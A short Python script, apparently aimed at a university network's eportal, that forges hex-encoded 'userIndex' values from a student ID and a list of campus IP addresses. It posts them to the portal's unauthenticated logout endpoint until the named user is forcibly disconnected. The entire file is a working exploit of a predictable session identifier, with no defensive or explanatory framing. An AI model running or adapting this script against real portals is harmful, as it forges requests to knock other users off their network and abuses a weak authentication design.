#coding=utf-8
#!/usr/bin/python3
import re
import requests

def changeStudentIDFormat(stuID) :
	result = ""
	for c in stuID:
		result += "3"+c
	return result
def changeIPFormat(ip):
	result = ""
	for c in ip:
		if c=='.':
			result += "2e"
		else:
			result += "3"+c
	return result+"5f"


PREFIX = "31623633373162623762613338646339393436366332643937656134613732325f"
STUID = "2015141462109"
HOST_URL = "http://192.168.2.135"

LOGOUT_URL = HOST_URL+"/eportal/InterFace.do?method=logout"

#get ip list
ipfile = open("/home/vega/scunet_ips.txt")
content = ipfile.read()
ipfile.close()
ips = re.findall('10\.132\.\d{1,3}\.\d{1,3}',content)
ips = [changeIPFormat(ip) for ip in ips]

#traverse ips
for ip in ips:
	r = requests.post(LOGOUT_URL, data={"userIndex":PREFIX+ip+changeStudentIDFormat(STUID)})
	r.encoding = 'utf-8' 
	if r.json()['result']=="success":
		print(STUID+" 已强制下线 ")
		break;
	#失败：{"result":"fail","message":"用户已不在线"}
	#成功：{"result":"success","message":"下线成功！"}
